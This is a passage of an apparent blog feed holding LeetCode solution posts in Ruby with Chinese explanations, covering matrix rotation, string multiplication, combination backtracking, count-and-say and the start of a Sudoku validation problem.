          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Rotate Image</title>
      <link href="/2018/03/22/Rotate-Image/"/>
      <url>/2018/03/22/Rotate-Image/</url>
      <content type="html"><![CDATA[<h1 id="48-Rotate-Image"><a href="#48-Rotate-Image" class="headerlink" title="48. Rotate Image"></a>48. Rotate Image</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>You are given an n x n 2D matrix representing an image.</p><p>Rotate the image by 90 degrees (clockwise).</p><p>Note:</p><p>You have to rotate the image in-place, which means you have to modify the input 2D matrix directly. DO NOT allocate another 2D matrix and do the rotation.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Given input matrix = </span><br><span class="line">[</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [4,5,6],</span><br><span class="line">  [7,8,9]</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">rotate the input matrix in-place such that it becomes:</span><br><span class="line">[</span><br><span class="line">  [7,4,1],</span><br><span class="line">  [8,5,2],</span><br><span class="line">  [9,6,3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Given input matrix =</span><br><span class="line">[</span><br><span class="line">  [ 5, 1, 9,11],</span><br><span class="line">  [ 2, 4, 8,10],</span><br><span class="line">  [13, 3, 6, 7],</span><br><span class="line">  [15,14,12,16]</span><br><span class="line">], </span><br><span class="line"></span><br><span class="line">rotate the input matrix in-place such that it becomes:</span><br><span class="line">[</span><br><span class="line">  [15,13, 2, 5],</span><br><span class="line">  [14, 3, 4, 1],</span><br><span class="line">  [12, 6, 8, 9],</span><br><span class="line">  [16, 7,10,11]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>题目要求把一个矩阵顺时针旋转90度。<br>主思路是先把矩阵转制，然后再把每行逆序即可。举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2 3       1 4 7       7 4 1</span><br><span class="line">4 5 6  -&gt;  2 5 8  -&gt;  8 5 2</span><br><span class="line">7 8 9       3 6 9       9 6 3</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[][]&#125; matrix</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Void&#125; Do not return anything, modify matrix in-place instead.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate</span><span class="params">(matrix)</span></span></span><br><span class="line">  n = matrix.length</span><br><span class="line">  n.times.each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    j = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; n</span><br><span class="line">      tmp = matrix[i][j]</span><br><span class="line">      matrix[i][j] = matrix[j][i]</span><br><span class="line">      matrix[j][i] = tmp</span><br><span class="line">      j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    matrix[i].reverse!</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N^2)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Multiply Strings</title>
      <link href="/2018/03/21/Multiply-Strings/"/>
      <url>/2018/03/21/Multiply-Strings/</url>
      <content type="html"><![CDATA[<h1 id="43-Multiply-Strings"><a href="#43-Multiply-Strings" class="headerlink" title="43. Multiply Strings"></a>43. Multiply Strings</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given two non-negative integers num1 and num2 represented as strings, return the product of num1 and num2, also represented as a string.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: num1 = &quot;2&quot;, num2 = &quot;3&quot;</span><br><span class="line">Output: &quot;6&quot;</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: num1 = &quot;123&quot;, num2 = &quot;456&quot;</span><br><span class="line">Output: &quot;56088&quot;</span><br></pre></td></tr></table></figure></p><p>Note:</p><ol><li>The length of both num1 and num2 is &lt; 110.</li><li>Both num1 and num2 contain only digits 0-9.</li><li>Both num1 and num2 do not contain any leading zero, except the number 0 itself.</li><li>You must not use any built-in BigInteger library or convert the inputs to integer directly.</li></ol><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>这个就是模拟乘法计算：</p><ul><li>先把两个字符串逆序</li><li>用一个字符串中的数去乘另一个字符串的每个数</li><li>把中间结果累加，当第一个字符串遍历完时，就计算完了</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; num1</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; num2</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(num1, num2)</span></span></span><br><span class="line">  num1.reverse!</span><br><span class="line">  num2.reverse!</span><br><span class="line">  s = Array.new(num1.length + num2.length, <span class="number">48</span>)</span><br><span class="line">  num1.bytes.each_with_index <span class="keyword">do</span> <span class="params">|n1, i|</span></span><br><span class="line">    num2.bytes.each_with_index <span class="keyword">do</span> <span class="params">|n2, j|</span></span><br><span class="line">      tmp = (n1 - <span class="number">48</span>) * (n2 - <span class="number">48</span>)</span><br><span class="line">      s[i+j+<span class="number">1</span>] = s[i+j+<span class="number">1</span>] - <span class="number">48</span> + (s[i+j] - <span class="number">48</span> + tmp) / <span class="number">10</span> + <span class="number">48</span>    </span><br><span class="line">      s[i+j] = (s[i+j] - <span class="number">48</span> + tmp) % <span class="number">10</span> + <span class="number">48</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  s.reverse!</span><br><span class="line">  s = s[<span class="number">1</span>..-<span class="number">1</span>] <span class="keyword">while</span> s.length &gt; <span class="number">1</span> <span class="keyword">and</span> s[<span class="number">0</span>] == <span class="number">48</span></span><br><span class="line">  s.pack(<span class="string">'c*'</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N^2)</code>，N为字符串长度</li><li>空间复杂度：<code>O(N)</code>，N为字符串长度</li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Combinations</title>
      <link href="/2018/03/20/Combinations/"/>
      <url>/2018/03/20/Combinations/</url>
      <content type="html"><![CDATA[<h1 id="Combinations"><a href="#Combinations" class="headerlink" title="Combinations"></a>Combinations</h1><h2 id="39-Combination-Sum"><a href="#39-Combination-Sum" class="headerlink" title="39. Combination Sum"></a>39. Combination Sum</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a set of candidate numbers (candidates) (without duplicates) and a target number (target), find all unique combinations in candidates where the candidate numbers sums to target.</p><p>The same repeated number may be chosen from candidates unlimited number of times.</p><p>Note:</p><ul><li>All numbers (including target) will be positive integers.</li><li>The solution set must not contain duplicate combinations.</li></ul><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [2,3,6,7], target = 7,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [7],</span><br><span class="line">  [2,2,3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [2,3,5], target = 8,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [2,2,2,2],</span><br><span class="line">  [2,3,3],</span><br><span class="line">  [3,5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>主要思路是：</p><ul><li>每取一个数，就要把它打组合全部找出</li><li>需要注意的是一个数可以重复取</li><li>把数组遍历完后，所有的组合就出来了</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; candidates</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combination_sum</span><span class="params">(candidates, target)</span></span></span><br><span class="line">  path, result = [], []</span><br><span class="line">  _combination_sum(candidates, target, <span class="number">0</span>, path, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _combination_sum<span class="params">(candidates, target, index, path, result)</span></span></span><br><span class="line">  <span class="keyword">if</span> target &lt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">elsif</span> target == <span class="number">0</span></span><br><span class="line">    new_path = path.dup</span><br><span class="line">    result &lt;&lt; new_path</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    i = index</span><br><span class="line">    <span class="keyword">while</span> i &lt; candidates.length</span><br><span class="line">      path.push(candidates[i]);</span><br><span class="line">      _combination_sum(candidates, target - candidates[i], i, path, result)</span><br><span class="line">      path.pop</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N!)</code></li><li>空间复杂度：<code>O(N!)</code></li></ul><h2 id="40-Combination-Sum-II"><a href="#40-Combination-Sum-II" class="headerlink" title="40. Combination Sum II"></a>40. Combination Sum II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a collection of candidate numbers (candidates) and a target number (target), find all unique combinations in candidates where the candidate numbers sums to target.</p><p>Each number in candidates may only be used once in the combination.</p><p>Note:</p><ul><li>All numbers (including target) will be positive integers.</li><li>The solution set must not contain duplicate combinations.</li></ul><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [10,1,2,7,6,1,5], target = 8,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [1, 7],</span><br><span class="line">  [1, 2, 5],</span><br><span class="line">  [2, 6],</span><br><span class="line">  [1, 1, 6]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: candidates = [2,5,2,1,2], target = 5,</span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [1,2,2],</span><br><span class="line">  [5]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>主要思路是：</p><ul><li>每取一个数，就要把它打组合全部找出</li><li>需要注意的是一个数只可以用一次</li><li>把数组遍历完后，所有的组合就出来了</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; candidates</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combination_sum2</span><span class="params">(candidates, target)</span></span></span><br><span class="line">  path, result = [], []</span><br><span class="line">  candidates.sort!</span><br><span class="line">  _combination_sum(candidates, target, <span class="number">0</span>, path, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _combination_sum<span class="params">(candidates, target, index, path, result)</span></span></span><br><span class="line">  <span class="keyword">if</span> target &lt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">elsif</span> target == <span class="number">0</span></span><br><span class="line">    new_path = path.dup</span><br><span class="line">    result.push(new_path)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    i = index</span><br><span class="line">    <span class="keyword">while</span> i &lt; candidates.length</span><br><span class="line">      path.push(candidates[i]);</span><br><span class="line">      _combination_sum(candidates, target - candidates[i], i + <span class="number">1</span>, path, result)</span><br><span class="line">      path.pop</span><br><span class="line">      <span class="keyword">while</span> (i &lt; candidates.length - <span class="number">1</span> <span class="keyword">and</span> candidates[i] == candidates[i + <span class="number">1</span>])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N!)</code></li><li>空间复杂度：<code>O(N!)</code></li></ul><h2 id="77-Combinations"><a href="#77-Combinations" class="headerlink" title="77. Combinations"></a>77. Combinations</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given two integers n and k, return all possible combinations of k numbers out of 1 … n.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 4, k = 2</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [2,4],</span><br><span class="line">  [3,4],</span><br><span class="line">  [2,3],</span><br><span class="line">  [1,2],</span><br><span class="line">  [1,3],</span><br><span class="line">  [1,4],</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>这题没啥好解释的，用深度优先搜索来解就行了。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; k</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">(n, k)</span></span></span><br><span class="line">  path, result = [], []</span><br><span class="line">  _combine(n, k, <span class="number">1</span>, path, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _combine<span class="params">(n, k, start, path, result)</span></span></span><br><span class="line">  <span class="keyword">if</span> path.size == k</span><br><span class="line">    new_path = path.dup</span><br><span class="line">    result.push(new_path)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    i = start</span><br><span class="line">    <span class="keyword">while</span> i &lt;= n</span><br><span class="line">      path.push(i);</span><br><span class="line">      _combine(n, k, i + <span class="number">1</span>, path, result)</span><br><span class="line">      path.pop</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n!)</code></li><li>空间复杂度：<code>O(n!)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Count and Say</title>
      <link href="/2018/03/19/Count-and-Say/"/>
      <url>/2018/03/19/Count-and-Say/</url>
      <content type="html"><![CDATA[<h1 id="38-Count-and-Say"><a href="#38-Count-and-Say" class="headerlink" title="38. Count and Say"></a>38. Count and Say</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>The count-and-say sequence is the sequence of integers with the first five terms as following:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.     1</span><br><span class="line">2.     11</span><br><span class="line">3.     21</span><br><span class="line">4.     1211</span><br><span class="line">5.     111221</span><br></pre></td></tr></table></figure></p><ul><li>1 is read off as “one 1” or 11.</li><li>11 is read off as “two 1s” or 21.</li><li>21 is read off as “one 2, then one 1” or 1211.</li></ul><p>Given an integer n where 1 ≤ n ≤ 30, generate the nth term of the count-and-say sequence.</p><p>Note: Each term of the sequence of integers will be represented as a string.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1</span><br><span class="line">Output: &quot;1&quot;</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4</span><br><span class="line">Output: &quot;1211&quot;</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>用递归思路实现：</p><ul><li>n = 1时，直接返回字符串“1”；</li><li>n &gt; 1时，拿到n-1的字符串，用循环统计。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_and_say</span><span class="params">(n)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">""</span> <span class="keyword">if</span> n &lt;= <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">"1"</span> <span class="keyword">if</span> n == <span class="number">1</span></span><br><span class="line">  pre = count_and_say(n - <span class="number">1</span>) + <span class="string">"#"</span></span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  count = <span class="number">1</span></span><br><span class="line">  s = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; pre.length - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> pre[i] == pre[i + <span class="number">1</span>]</span><br><span class="line">      count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      s &lt;&lt; <span class="string">"<span class="subst">#&#123;count.to_s&#125;</span><span class="subst">#&#123;pre[i]&#125;</span>"</span></span><br><span class="line">      count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N!)</code></li><li>空间复杂度：<code>O(N!)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sudoku</title>
      <link href="/2018/03/18/Sudoku/"/>
      <url>/2018/03/18/Sudoku/</url>
      <content type="html"><![CDATA[<h1 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h1><h2 id="Valid-Sudoku"><a href="#Valid-Sudoku" class="headerlink" title="Valid Sudoku"></a>Valid Sudoku</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Determine if a 9x9 Sudoku board is valid. Only the filled cells need to be validated according to the following rules:<br>Each row must contain the digits 1-9 without repetition.Each column must contain the digits 1-9 without repetition.Each of the 9 3x3 sub-boxes of the grid must contain the digits 1-9 without repetition.</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/ff/Sudoku-by-L2G-20050714.svg/250px-Sudoku-by-L2G-20050714.svg.png" alt="Sudoku.png"><br>A partially filled sudoku which is valid.</p><p>The Sudoku board could be partially filled, where empty cells are filled with the character ‘.’.<br>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [&quot;5&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;],</span><br><span class="line">  [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;],</span><br><span class="line">  [&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]</span><br><span class="line">]</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  [&quot;8&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;],</span><br><span class="line">  [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;],</span><br><span class="line">  